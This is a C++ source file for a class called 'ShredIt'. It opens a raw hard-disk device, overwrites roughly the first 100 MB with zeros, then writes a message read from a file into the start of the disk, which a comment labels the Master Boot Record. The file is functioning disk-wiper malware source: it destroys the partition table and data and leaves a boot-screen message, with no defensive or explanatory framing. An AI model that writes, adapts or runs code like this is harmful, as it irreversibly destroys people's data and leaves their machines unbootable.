#include "shredder.hpp"
#include <fstream>
#include <string>
#include <iostream>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
using namespace std;

string ShredIt::Bootmsg(const char *Path){
    fstream File;
    string line, black;
    File.open(Path);
    while(!File.eof()){getline(File, line,'#');black+=line;}
    return black;
}
// Writing boot msg in Master Boot Record (MBR)
void ShredIt::BootWriter(string msg){
    ofstream myfile;
    myfile.open(HARD_DISK);
    myfile <<msg;
    myfile.close();
}
// Shredding HardDrive
int ShredIt::Wipeit(string msg){
    int hdd = open(HARD_DISK, O_WRONLY);  // Open hard drive 
    if(hdd<0){fprintf(stderr, "Error opening device file.\n");return EXIT_FAILURE;} // Error in opening HDD
    char* zeros = (char*)calloc(1, 512); // generate 0
    ssize_t written, total = 0;
    do {
        total += written = write(hdd, zeros, 512);  //Write 0 in hdd 
        printf("\rBytes : %ld", total); // show progress 
        if(total==102400000){  // recommanded 102400000
            ShredIt::BootWriter(msg);
            printf("\nMsg writed Succesfully\n");
            break;
        }
    } while (written == 512);
    close(hdd);
    free(zeros);
    return 0;
}
/*
Main Function of class ShredIt
*/
void ShredIt::RunShreder(const char *path){
    string MSSG=Bootmsg(path);
    ShredIt::Wipeit(MSSG);
}